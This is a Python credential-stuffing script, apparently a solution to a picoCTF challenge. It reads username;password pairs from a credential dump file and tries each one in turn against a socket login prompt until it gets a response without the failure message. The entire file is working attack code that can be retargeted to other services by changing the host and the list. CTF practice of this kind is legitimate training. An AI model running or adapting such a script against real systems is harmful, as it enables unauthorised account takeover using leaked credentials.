#!/usr/bin/env python3
import socket

HOST = "crystal-peak.picoctf.net"
PORT = 49527
CREDS_FILE = "creds-dump.txt"

FAIL_STRING = b"Invalid username or password"

def recv_until(s, marker, timeout=10):
    s.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def try_login(username, password):
    try:
        with socket.create_connection((HOST, PORT), timeout=10) as s:
            recv_until(s, b"Username:")
            s.sendall((username + "\n").encode())
            recv_until(s, b"Password:")
            s.sendall((password + "\n").encode())
            response = recv_until(s, FAIL_STRING, timeout=10)
            return response, None
    except Exception as e:
        return None, str(e)

def main():
    with open(CREDS_FILE, "r") as f:
        lines = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(lines)} credential pairs")
    print(f"[*] Targeting {HOST}:{PORT}\n")

    # Test first attempt with full error output
    line = lines[0]
    username, password = line.split(";", 1)
    print(f"[DEBUG] Testing first cred: {username}:{password}")
    response, err = try_login(username, password)
    if err:
        print(f"[DEBUG] Exception: {err}")
    else:
        print(f"[DEBUG] Raw response: {repr(response)}")
    print()

    for i, line in enumerate(lines):
        if ";" not in line:
            continue

        username, password = line.split(";", 1)
        response, err = try_login(username, password)

        if err or response is None:
            print(f"[!] [{i+1}] Error on {username}: {err}")
            continue

        if FAIL_STRING in response:
            print(f"[-] [{i+1}/{len(lines)}] {username}:{password}")
        else:
            print(f"\n[+] SUCCESS! username={username} password={password}")
            print(f"[+] Server response:\n{response.decode(errors='replace')}\n")
            break

if __name__ == "__main__":
    main()